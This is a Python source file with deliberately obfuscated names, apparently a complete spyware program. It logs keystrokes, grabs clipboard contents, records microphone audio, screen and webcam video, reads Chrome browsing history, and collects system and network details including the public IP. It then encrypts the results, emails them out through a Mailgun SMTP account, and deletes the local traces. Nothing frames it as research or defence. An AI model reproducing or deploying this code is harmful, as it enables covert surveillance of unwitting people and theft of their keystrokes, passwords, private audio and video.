import csv
import logging
import os
import platform
import random
import re
import smtplib
import socket
import sqlite3
import string
import subprocess
import uuid
from concurrent.futures import ThreadPoolExecutor
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import perf_counter

import clipboard
import cv2
import numpy as np
import psutil
import pyautogui
import sounddevice as sd
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write

lr=logging.getLogger("22i3e274yhe92in28y4")
lr.setLevel(logging.DEBUG)
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%m-%d %H:%M",
    filename="37h4d9h83n4ch3x4o83dh.log",
)
ce=logging.StreamHandler()
ce.setLevel(logging.INFO)
fr=logging.Formatter("%(name)s: %(levelname)s %(message)s")
ce.setFormatter(fr)
lr.addHandler(ce)
ko="ko.txt"
so="so.txt"
co="co.txt"
cro="cro.csv"
ao="ao.wav"
sso="sso.png"
srv="srv.mp4"
fcv="fcv.mp4"
kie="kie.txt"
sie="sie.txt"
cie="cie.txt"
crie="crie.csv"
kid="kid.txt"
sid="sid.txt"
cid="cid.txt"
crid="crid.csv"
bp889uen39h=os.getenv("lbp")
eribdieubn0394u394=os.getenv("rm")
lr.info("Using Base Path: %s", bp889uen39h)
load_dotenv()
def sm372ge8bd23b2d(el98492ud929hd94uh):
    me27g3idb2oibq=os.getenv("me")
    me923h9dh2ihd=os.getenv("mp")
    try:
        sv4928h9rh92o3ihoqi=smtplib.SMTP("smtp.mailgun.org", 587)
        sv4928h9rh92o3ihoqi.login(me27g3idb2oibq, me923h9dh2ihd)
    except:
        print("Error Connecting To Mail Server")
    sb28g3bdsiq="Report:"
    byd83333qbdibu3=f"Dear User\n\nThis is a test email\n\nThank you!"
    gsm832g78dui3ediuw=f"Subject: {sb28g3bdsiq}\n\n{byd83333qbdibu3}"
    try:
        sv4928h9rh92o3ihoqi.sendmail(me27g3idb2oibq, el98492ud929hd94uh, gsm832g78dui3ediuw)
    except:
        print("Error Sending Mail")
    sv4928h9rh92o3ihoqi.quit()
def d27g3hqwodubdiuwjbidwkbkebk(fr93hfu4hionow, at28g3s82biuq, el98492ud929hd94uh):
    me27g3idb2oibq=os.getenv("me")
    me923h9dh2ihd=os.getenv("mp")
    gsm832g78dui3ediuw=MIMEMultipart()
    gsm832g78dui3ediuw["From"]=me27g3idb2oibq
    gsm832g78dui3ediuw["To"]=el98492ud929hd94uh
    gsm832g78dui3ediuw["Subject"]="Reports:"
    byd83333qbdibu3="Dear User\n\nPlease find attached the reports you requested\n\nThank you!"
    gsm832g78dui3ediuw.attach(MIMEText(byd83333qbdibu3, "plain"))
    fn3h2oeih2oeo23nenq=fr93hfu4hionow
    ahmd2yb37gede287gdiqu=open(at28g3s82biuq, "rb")
    atu2tuvuevuey2ib3i=MIMEBase("application", "octet-stream")
    atu2tuvuevuey2ib3i.set_payload((ahmd2yb37gede287gdiqu).read())
    encoders.encode_base64(atu2tuvuevuey2ib3i)
    atu2tuvuevuey2ib3i.add_header("Content-Disposition", "ahmd2yb37gede287gdiqu; filename= %s" % fn3h2oeih2oeo23nenq)
    gsm832g78dui3ediuw.attach(atu2tuvuevuey2ib3i)
    try:
        sv4928h9rh92o3ihoqi=smtplib.SMTP("smtp.mailgun.org", 587)
        sv4928h9rh92o3ihoqi.login(me27g3idb2oibq, me923h9dh2ihd)
    except:
        print("Error Connecting To Mail Server")
    gs2888888g3qd3yd8q=gsm832g78dui3ediuw.as_string()
    try:
        sv4928h9rh92o3ihoqi.sendmail(me27g3idb2oibq, el98492ud929hd94uh, gs2888888g3qd3yd8q)
        sv4928h9rh92o3ihoqi.quit()
    except:
        print("Error Sending Mail")
def gs4ge76328uqbbeiuqe(b7634d7uyqvu, ssx8g28dg8g3="B"):
    fr8372ge2y3suq=1024
    for unr5493iuiuebida in ["", "K", "M", "G", "T", "P"]:
        if b7634d7uyqvu < fr8372ge2y3suq:
            return f"{b7634d7uyqvu:.2f}{unr5493iuiuebida}{ssx8g28dg8g3}"
        b7634d7uyqvu /= fr8372ge2y3suq
def si9328hdhqiuiad():
    fp2983hdiiua=os.path.join(bp889uen39h, so)
    with open(fp2983hdiiua, "a") as f:
        lr.info("Writing System Information To File %s", fp2983hdiiua)
        f.write("SYSTEM INFORMATION:\n")
        hn9382hn9uniuq=socket.gethostname()
        iaieubdw87382=socket.gethostbyname(hn9382hn9uniuq)
        try:
            ei83d98p4d3jw9=get("https://api.ipify.org").text
            f.write("Public IP Address: " + ei83d98p4d3jw9 + "\n")
        except Exception:
            lr.exception("Could Not Access Public IP Address Via API")
            f.write("Couldn't get public IP aruw4id928hd9d2iui!\n")
        try:
            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hn9382hn9uniuq + "\n")
            f.write("Private IP Address: " + iaieubdw87382 + "\n")
            f.write("Network Name: " + platform.node() + "\n")
            f.write(
                "MAC Address: "
                + ":".join(re.findall("..", "%012x" % uuid.getnode()))
                + "\n"
            )
            f.write(
                "RAM: "
                + str(round(psutil.virtual_memory().total / (1024.0**3)))
                + " GB\n"
            )
            f.write("System Release: " + platform.release() + "\n")
            ahb43bdiwbiubai=platform.architecture()
            f.write("Architecture: (" + ahb43bdiwbiubai[0] + ", " + ahb43bdiwbiubai[1] + ")\n")
            f.write("Platform: " + platform.platform() + "\n\n")
        except:
            lr.exception("Basic System Information Capturing Error")
            print("Error Capturing Basic System Information")
        try:
            lr.info("Writing CPU Information To File %s", fp2983hdiiua)
            f.write("CPU INFORMATION\n")
            pc873h2iudbiuqbaidb=str(psutil.cpu_count(logical=False))
            f.write("Physical Cores: " + pc873h2iudbiuqbaidb + "\n")
            tc2o3d82g7biwqboiadbi=str(psutil.cpu_count(logical=True))
            f.write("Total Cores: " + tc2o3d82g7biwqboiadbi + "\n")
            cfq82y3sb82b2sub=psutil.cpu_freq()
            mf737uywdvuyvua=str(cfq82y3sb82b2sub.max)
            mfq87wh12qhiubk=str(cfq82y3sb82b2sub.min)
            cyfc2eqvgjavi31=str(cfq82y3sb82b2sub.current)
            f.write("Max Frequency: " + mf737uywdvuyvua + " Mhz\n")
            f.write("Min Frequency: " + mfq87wh12qhiubk + " Mhz\n")
            f.write("Current Frequency: " + cyfc2eqvgjavi31 + " Mhz\n")
            for i, p in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                f.write(f"Core {i}: {p}%\n")
            f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")
        except:
            lr.exception("CPU Information Capturing Error")
            print("Error Capturing CPU Information")
        try:
            lr.info("Writing Memory Usage Information To File %s", fp2983hdiiua)
            f.write("MEMORY USAGE:\n")
            sm9472biwdbi=psutil.virtual_memory()
            f.write(f"Total: {gs4ge76328uqbbeiuqe(sm9472biwdbi.total)}\n")
            f.write(f"Available: {gs4ge76328uqbbeiuqe(sm9472biwdbi.available)}\n")
            f.write(f"Used: {gs4ge76328uqbbeiuqe(sm9472biwdbi.used)}\n")
            f.write(f"Percentage: {sm9472biwdbi.percent}%\n")
            sp8382h43hqdoain=psutil.swap_memory()
            f.write(f"Total: {gs4ge76328uqbbeiuqe(sp8382h43hqdoain.total)}\n")
            f.write(f"Free: {gs4ge76328uqbbeiuqe(sp8382h43hqdoain.free)}\n")
            f.write(f"Used: {gs4ge76328uqbbeiuqe(sp8382h43hqdoain.used)}\n")
            f.write(f"Percentage: {sp8382h43hqdoain.percent}%\n\n")
        except:
            lr.exception("Memory Usage Information Capturing Error")
            print("Error Capturing Memory Usage Information")
        try:
            lr.info("Writing Disk Information To File %s", fp2983hdiiua)
            f.write("DISK INFORMATION\n")
            pts7b2dyebiqb=psutil.disk_partitions()
            for ptn9723hd8qbiueba in pts7b2dyebiqb:
                f.write(f"Device: {ptn9723hd8qbiueba.device}\n")
                f.write(f"Mountpoint: {ptn9723hd8qbiueba.mountpoint}\n")
                f.write(f"File System Type: {ptn9723hd8qbiueba.fstype}\n")
                try:
                    pudwyq3bd28bqibak=psutil.disk_usage(ptn9723hd8qbiueba.mountpoint)
                except PermissionError:
                    continue
                f.write(f"Total Size: {gs4ge76328uqbbeiuqe(pudwyq3bd28bqibak.total)}\n")
                f.write(f"Used: {gs4ge76328uqbbeiuqe(pudwyq3bd28bqibak.used)}\n")
                f.write(f"Free: {gs4ge76328uqbbeiuqe(pudwyq3bd28bqibak.free)}\n")
                f.write(f"Percentage: {pudwyq3bd28bqibak.percent}%\n")
        except:
            lr.exception("Disk Information Capturing Error")
            print("Error Capturing Disk Information")
        try:
            lr.info("Writing I/O Statistics To File %s", fp2983hdiiua)
            f.write("IO STATISTICS\n")
            di923hd9ohaeo0dieoinoa=psutil.disk_io_counters()
            f.write(f"Total Read: {gs4ge76328uqbbeiuqe(di923hd9ohaeo0dieoinoa.read_bytes)}\n")
            f.write(f"Total Write: {gs4ge76328uqbbeiuqe(di923hd9ohaeo0dieoinoa.write_bytes)}\n\n")
        except:
            lr.exception("I/O Statistics Capturing Error")
            print("Error Capturing I/O Statistics")
        try:
            lr.info("Writing Network Information To File %s", fp2983hdiiua)
            f.write("NETWORK INFORMATION\n")
            iadrpiuwb92ud9n=psutil.net_if_addrs()
            for in23udn82najnqian, iiaeyd3y827h3uhiq in iadrpiuwb92ud9n.items():
                for aruw4id928hd9d2iui in iiaeyd3y827h3uhiq:
                    f.write(f"Interface: {in23udn82najnqian}\n")
                    if str(aruw4id928hd9d2iui.family) == "AddressFamily.AF_INET":
                        f.write(f"IP Address: {aruw4id928hd9d2iui.aruw4id928hd9d2iui}\n")
                        f.write(f"Netmask: {aruw4id928hd9d2iui.netmask}\n")
                        f.write(f"Broadcast IP: {aruw4id928hd9d2iui.broadcast}\n")
                    elif str(aruw4id928hd9d2iui.family) == "AddressFamily.AF_PACKET":
                        f.write(f"MAC Address: {aruw4id928hd9d2iui.aruw4id928hd9d2iui}\n")
                        f.write(f"Netmask: {aruw4id928hd9d2iui.netmask}\n")
                        f.write(f"Broadcast MAC: {aruw4id928hd9d2iui.broadcast}\n")
        except:
            lr.exception("Network Information Capturing Error")
            print("Error Capturing Network Information")
        f.close()
    try:
        lr.info("Sending System Information Encrypted Mail")
        ened392j9e8dub384ijake(
            fp2983hdiiua,
            os.path.join(bp889uen39h, sie),
            so,
            os.path.join(bp889uen39h, sie),
            eribdieubn0394u394,
        )
        lr.info("Sent System Information Encrypted Mail")
    except:
        lr.critical("System Information Mailing Error")
        print("Error Sending Mail")
def chi23bi3gg2ug2jhqb():
    fp2983hdiiua=os.path.join(bp889uen39h, cro)
    try:
        lr.info("Creating Browser History Log File %s", fp2983hdiiua)
        hr327tgqikBKJBKES=["URL", "TITLE", "VISIT COUNT", "TIME OF LAST VISIT"]
        with open(fp2983hdiiua, "w", newline="") as fh:
            wrs98hd32uihkqjbe=csv.writer(fh)
            wrs98hd32uihkqjbe.writerow(hr327tgqikBKJBKES)
            fh.close()
        lr.info("Created Browser History Log File")
    except:
        lr.exception("Browser History Log File Creation Error")
        print("Error Creating CSV Browser History Log File")
    try:
        cid32udb23dbqo3=sqlite3.connect("/home/nvombat/.config/google-chrome/Default/History")
    except:
        lr.critical("SQL Server Connection Error")
        print("Error Connecting To Server")
    c=cid32udb23dbqo3.cursor()
    try:
        c.execute("select url, title, visit_count, last_visit_time from urls")
        raytv328q3ieubkj=c.fetchall()
        with open(fp2983hdiiua, "a", newline="") as fh:
            for r in raytv328q3ieubkj:
                wrs98hd32uihkqjbe=csv.writer(fh)
                wrs98hd32uihkqjbe.writerow(r)
        fh.close()
        lr.info("Browser History Logged Successfully")
    except sqlite3.OperationalError:
        lr.warning("Browser In Use - Unable To Access Locked File")
        print("Browser Currently In Use")
    c.close()
    try:
        lr.info("Sending Browser History Information Encrypted Mail")
        ened392j9e8dub384ijake(
            fp2983hdiiua,
            os.path.join(bp889uen39h, crie),
            cro,
            os.path.join(bp889uen39h, crie),
            eribdieubn0394u394,
        )
        lr.info("Sent Browser History Information Encrypted Mail")
    except:
        lr.critical("Browser History Information Mailing Error")
        print("Error Sending Mail")
def cii3udbedib2iebqk():
    fp2983hdiiua=os.path.join(bp889uen39h, co)
    try:
        with open(fp2983hdiiua, "a") as f:
            lr.info("Writing Clipboard Data To File %s", fp2983hdiiua)
            try:
                cd3ur8drkbwkjbrdr=clipboard.paste()
                f.write("Clipboard Data:\n" + cd3ur8drkbwkjbrdr)
                lr.info("Captured Clipboard Information Successfully")
            except:
                lr.exception("Clipboard Information Capturing Error")
                print("Clipboard Information Couldn't Be Captured")
            f.close()
        try:
            lr.info("Sending Clipboard Information Encrypted Mail")
            ened392j9e8dub384ijake(
                fp2983hdiiua,
                os.path.join(bp889uen39h, cie),
                co,
                os.path.join(bp889uen39h, cie),
                eribdieubn0394u394,
            )
            lr.info("Sent Clipboard Information Encrypted Mail")
        except:
            lr.critical("Clipboard Information Mailing Error")
            print("Error Sending Mail")
    except:
        lr.critical("Clipboard Information File Writing Error")
        print("Clipboard Information Couldn't Be Captured")
def sidieubdi3u4biq():
    try:
        lr.info("Recording Audio")
        fs=44100
        dn=5
        rn=sd.rec(int(dn * fs), samplerate=fs, channels=2)
        sd.wait()
        fp2983hdiiua=os.path.join(bp889uen39h, ao)
        write(fp2983hdiiua, fs, rn)
        lr.info("Audio Recorded Successfully")
    except:
        lr.info("Audio Recording Error")
        print("Error Recording Audio")
    try:
        lr.info("Sending Audio Recording Mail")
        d27g3hqwodubdiuwjbidwkbkebk(ao, fp2983hdiiua, eribdieubn0394u394)
        lr.info("Sent Audio Mail")
    except:
        lr.critical("Audio Recording Mailing Error")
        print("Error Sending Mail")
def ss87gg82gd3b4kkja():
    try:
        lr.info("Capturing Screenshot")
        ss87gg82gd3b4kkja=ImageGrab.grab(
            bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None
        )
        fp2983hdiiua=os.path.join(bp889uen39h, sso)
        ss87gg82gd3b4kkja.save(fp2983hdiiua)
        lr.info("Screenshot Captured Successfully")
    except:
        lr.exception("Screenshot Capturing Error")
        print("Error Capturing Screenshot")
    try:
        lr.info("Sending Screenshot Email")
        d27g3hqwodubdiuwjbidwkbkebk(sso, fp2983hdiiua, eribdieubn0394u394)
        lr.info("Sent Screenshot Email")
    except:
        lr.critical("Screenshot Mailing Error")
        print("Error Sending Mail")
def gsr328udybqhbak():
    try:
        opo92uh3uhd=subprocess.Popen(
            'xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE
        ).communicate()[0]
        rsn283hi4uqhik=opo92uh3uhd.split()[0].split(b"x")
        return {"width": rsn283hi4uqhik[0].decode(), "height": rsn283hi4uqhik[1].decode()}
    except:
        lr.error("Screen Resolution Error")
        print("Error Getting Screen Resolution")
def rfmru3bf42u8uhbikq():
    fpfc8y2v3qhajh=os.path.join(bp889uen39h, fcv)
    try:
        lr.info("Recording Front Camera")
        rsn283hi4uqhik=gsr328udybqhbak()
        wtfv3u2qvjhabmba=int(rsn283hi4uqhik["width"])
        htfu2y3viubqibke=int(rsn283hi4uqhik["height"])
        rwb82ubi3ubkqjb=(wtfv3u2qvjhabmba, htfu2y3viubqibke)
        c38g4ibkajkedrf=cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fd74tfvqahjbk2j3=60.0
        fc48y2ggqkjbakd=cv2.VideoWriter(fpfc8y2v3qhajh, c38g4ibkajkedrf, fd74tfvqahjbk2j3, rwb82ubi3ubkqjb)
        wc83i2k3nql3q3=cv2.VideoCapture(0)
        i42g8ydqiabkjbdk=perf_counter()
        while True:
            fc=ImageGrab.grab(bbox=(0, 0, wtfv3u2qvjhabmba, htfu2y3viubqibke))
            im2o3gqibknd=np.array(fc)
            ifn482gqikbakje=cv2.cvtColor(im2o3gqibknd, cv2.COLOR_BGR2RGB)
            _, f651fyjkbkqje=wc83i2k3nql3q3.read()
            duy34udbakjdak, f2iqbkBKAAE, _=f651fyjkbkqje.shape
            ifn482gqikbakje[0:duy34udbakjdak, 0:f2iqbkBKAAE, :]=f651fyjkbkqje[0:duy34udbakjdak, 0:f2iqbkBKAAE, :]
            fc48y2ggqkjbakd.write(ifn482gqikbakje)
            e23iueiuabkj=perf_counter()
            if int(e23iueiuabkj - i42g8ydqiabkjbdk) == 10:
                lr.info("Front Camera Video Recorded Successfully")
                break
    except:
        lr.exception("Front Camera Video Recording Error")
        print("Error Recording Video From Front Camera")
    try:
        lr.info("Sending Front Camera Video Mail")
        d27g3hqwodubdiuwjbidwkbkebk(fcv, fpfc8y2v3qhajh, eribdieubn0394u394)
        lr.info("Sent Front Camera Video Mail")
    except:
        lr.critical("Front Camera Video Mailing Error")
        print("Error Sending Mail")
def rsiuhhqbkajbkeead():
    fps87gq3ibKJB=os.path.join(bp889uen39h, srv)
    try:
        lr.info("Recording Screen")
        rsn283hi4uqhik=gsr328udybqhbak()
        wtfv3u2qvjhabmba=int(rsn283hi4uqhik["width"])
        htfu2y3viubqibke=int(rsn283hi4uqhik["height"])
        rwb82ubi3ubkqjb=(wtfv3u2qvjhabmba, htfu2y3viubqibke)
        c38g4ibkajkedrf=cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fd74tfvqahjbk2j3=60.0
        sn84372giabbd=cv2.VideoWriter(fps87gq3ibKJB, c38g4ibkajkedrf, fd74tfvqahjbk2j3, rwb82ubi3ubkqjb)
        i42g8ydqiabkjbdk=perf_counter()
        while True:
            sc=pyautogui.screenshot()
            f323giuqbkjbdkj=np.array(sc)
            f323giuqbkjbdkj=cv2.cvtColor(f323giuqbkjbdkj, cv2.COLOR_BGR2RGB)
            sn84372giabbd.write(f323giuqbkjbdkj)
            e23iueiuabkj=perf_counter()
            if int(e23iueiuabkj - i42g8ydqiabkjbdk) == 10:
                lr.info("Recorded Screen Successfully")
                break
    except:
        lr.exception("Screen Recording Error")
        print("Error Recording User Screen")
    try:
        lr.info("Sending Screen Recording Mail")
        d27g3hqwodubdiuwjbidwkbkebk(srv, fps87gq3ibKJB, eribdieubn0394u394)
        lr.info("Sent Screen Recording Mail")
    except:
        lr.critical("Screen Recording Mailing Error")
        print("Error Sending Mail")
class lk32ugqiuabkeb:
    def __init__(self):
        self.cn87g43iuaiebkd=0
        self.ky328g7eiuabjkd=[]
        self.fp2983hdiiua=os.path.join(bp889uen39h, ko)
        self.efp23uhiqjbkaejd=os.path.join(bp889uen39h, kie)
    def op2hqijbkjabd(self, k487giwukabdk):
        self.ky328g7eiuabjkd.append(k487giwukabdk)
        self.cn87g43iuaiebkd=self.cn87g43iuaiebkd + 1
        print("{0} pressed".format(k487giwukabdk))
        if self.cn87g43iuaiebkd >= 1:
            self.cn87g43iuaiebkd=0
            self.wrf984howondl(self.ky328g7eiuabjkd)
            self.ky328g7eiuabjkd=[]
    def or873giuebkabjkd(self, k487giwukabdk):
        if k487giwukabdk == Key.esc:
            return False
    def wrf984howondl(self, k472giwdabkedbk):
        with open(self.fp2983hdiiua, "a") as f:
            for k487giwukabdk in k472giwdabkedbk:
                fk834wuikajnkd=str(k487giwukabdk).replace("'", "")
                if fk834wuikajnkd.find("space") > 0:
                    f.write("\n")
                elif fk834wuikajnkd.find("Key") == -1:
                    f.write(fk834wuikajnkd)
    def lg43uygwabkdj(self):
        with Listener(on_press=self.op2hqijbkjabd, on_release=self.or873giuebkabjkd) as l:
            l.join()
        print("Logging Complete")
        try:
            ened392j9e8dub384ijake(
                self.fp2983hdiiua,
                self.efp23uhiqjbkaejd,
                ko,
                self.efp23uhiqjbkaejd,
                eribdieubn0394u394,
            )
        except:
            print("Error Sending Mail")
def rkl9283bquidbikb():
    try:
        lr.info("Logging Keys")
        klg8742gyq3kbjbkr=lk32ugqiuabkeb()
        klg8742gyq3kbjbkr.lg43uygwabkdj()
        lr.info("Keys Logged Successfully")
    except:
        lr.critical("Keylogging Error")
def rpl42ubiqubka():
    try:
        lr.info("Creating Threadpool")
        etf632tfvqujhvjhA243uniwn=ThreadPoolExecutor(max_workers=8)
        lr.info("Running Threads")
        t1=etf632tfvqujhvjhA243uniwn.submit(rkl9283bquidbikb)
        t2=etf632tfvqujhvjhA243uniwn.submit(si9328hdhqiuiad)
        t3=etf632tfvqujhvjhA243uniwn.submit(cii3udbedib2iebqk)
        t4=etf632tfvqujhvjhA243uniwn.submit(sidieubdi3u4biq)
        t5=etf632tfvqujhvjhA243uniwn.submit(ss87gg82gd3b4kkja)
        t6=etf632tfvqujhvjhA243uniwn.submit(rsiuhhqbkajbkeead)
        t7=etf632tfvqujhvjhA243uniwn.submit(rfmru3bf42u8uhbikq)
        t8=etf632tfvqujhvjhA243uniwn.submit(chi23bi3gg2ug2jhqb)
        etf632tfvqujhvjhA243uniwn.shutdown(wait=True)
    except:
        lr.critical("Threading Error")
        print("Error Running Threads")
def gecylrnwodinndw(fn3h2oeih2oeo23nenq: str):
    try:
        k487giwukabdk=Fernet.generate_key()
    except:
        print("Error Generating Encryption Key")
    try:
        fp2983hdiiua=os.path.join(os.getenv("lbp"), fn3h2oeih2oeo23nenq)
        kfg42iuqkjbed=open(fp2983hdiiua, "wb")
        kfg42iuqkjbed.write(k487giwukabdk)
        kfg42iuqkjbed.close()
    except:
        print("Error Writing Key To File")
def ened392j9e8dub384ijake(
    fte82u3iqubk: str,
    efni24ubqijbka: str,
    fn3h2oeih2oeo23nenq: str,
    ahmd2yb37gede287gdiqu: str,
    el98492ud929hd94uh: str,
):
    k487giwukabdk=os.getenv("ek")
    with open(fte82u3iqubk, "rb") as f:
        d87g3eiuwkjd=f.read()
    fnt873g42iwbakj=Fernet(k487giwukabdk)
    entd874giduqbkaje=fnt873g42iwbakj.encrypt(d87g3eiuwkjd)
    with open(efni24ubqijbka, "wb") as f:
        f.write(entd874giduqbkaje)
    d27g3hqwodubdiuwjbidwkbkebk(fn3h2oeih2oeo23nenq, ahmd2yb37gede287gdiqu, el98492ud929hd94uh)
def efc87g4iuqbkdb():
    kpo2983hidquen=os.path.join(bp889uen39h, ko)
    cp92h4hiqubkaje=os.path.join(bp889uen39h, co)
    sp27g4qiubkd=os.path.join(bp889uen39h, so)
    crpiu24gbqjbkd=os.path.join(bp889uen39h, cro)
    kep8yy34gi2qbd=os.path.join(bp889uen39h, kie)
    cepiu34bdjiwkq=os.path.join(bp889uen39h, cie)
    syb3ebdwkjq=os.path.join(bp889uen39h, sie)
    cep4y2bkqjbd=os.path.join(bp889uen39h, cep4y2bkqjbd)
    fep8742giqejbdj=[kpo2983hidquen, cp92h4hiqubkaje, sp27g4qiubkd, crpiu24gbqjbkd]
    efniu342ndkwjak=[kep8yy34gi2qbd, cepiu34bdjiwkq, syb3ebdwkjq, cep4y2bkqjbd]
    cnt=0
    k487giwukabdk=os.getenv("ek")
    for ef in fep8742giqejbdj:
        with open(fep8742giqejbdj[cnt], "rb") as f:
            d87g3eiuwkjd=f.read()
        fnt873g42iwbakj=Fernet(k487giwukabdk)
        entd874giduqbkaje=fnt873g42iwbakj.encrypt(d87g3eiuwkjd)
        with open(efniu342ndkwjak[cnt], "wb") as f:
            f.write(entd874giduqbkaje)
        cnt += 1
def df8b4qkjedb():
    k487giwukabdk=os.getenv("ek")
    kpo2983hidquen=os.path.join(bp889uen39h, kie)
    sp27g4qiubkd=os.path.join(bp889uen39h, sie)
    cp92h4hiqubkaje=os.path.join(bp889uen39h, cie)
    crpiu24gbqjbkd=os.path.join(bp889uen39h, crie)
    d87g4debkjk=os.path.join(bp889uen39h, kid)
    dso2i3hqjENDKJN=os.path.join(bp889uen39h, sid)
    d87gdeqbdkq=os.path.join(bp889uen39h, cid)
    d83y27gqdjbkde=os.path.join(bp889uen39h, crid)
    ef87g3qiueK=[kpo2983hidquen, sp27g4qiubkd, cp92h4hiqubkaje, crpiu24gbqjbkd]
    df873grwbkab=[d87g4debkjk, dso2i3hqjENDKJN, d87gdeqbdkq, d83y27gqdjbkde]
    try:
        for fe, fd in zip(ef87g3qiueK, df873grwbkab):
            with open(fe, "rb") as f1:
                enc_data=f1.read()
            fnt873g42iwbakj=Fernet(k487giwukabdk)
            dyu4vdjwehqmd=fnt873g42iwbakj.decrypt(enc_data)
            with open(fd, "wb") as f2:
                f2.write(dyu4vdjwehqmd)
        f1.close()
        f2.close()
    except:
        print("Error Decrypting Files")
def df734giqkujbdk():
    fsmbiui23bdqk=[
        so,
        co,
        ko,
        ao,
        sso,
        srv,
        fcv,
        cro,
    ]
    ef87g3qiueK=[sie, cie, kie, crie]
    df873grwbkab=[sid, cid, kid, crid]
    for f984g2qkujbkedjb in fsmbiui23bdqk:
        try:
            lr.info("Deleting Files")
            os.remove(os.path.join(bp889uen39h, f984g2qkujbkedjb))
        except Exception:
            lr.warning("File %s Not Found", f984g2qkujbkedjb)
            print("File %s Not Found" % f984g2qkujbkedjb)
            continue
    for f984g2qkujbkedjb in ef87g3qiueK:
        try:
            lr.info("Deleting Encrypted Files")
            os.remove(os.path.join(bp889uen39h, f984g2qkujbkedjb))
        except Exception:
            lr.warning("Encrypted File %s Not Found", f984g2qkujbkedjb)
            print("Encrypted File %s Not Found" % f984g2qkujbkedjb)
            continue
    for f984g2qkujbkedjb in df873grwbkab:
        try:
            lr.info("Deleting Decrypted Files")
            os.remove(os.path.join(bp889uen39h, f984g2qkujbkedjb))
        except Exception:
            lr.warning("Decrypted File %s Not Found", f984g2qkujbkedjb)
            print("Decrypted File %s Not Found" % f984g2qkujbkedjb)
            continue
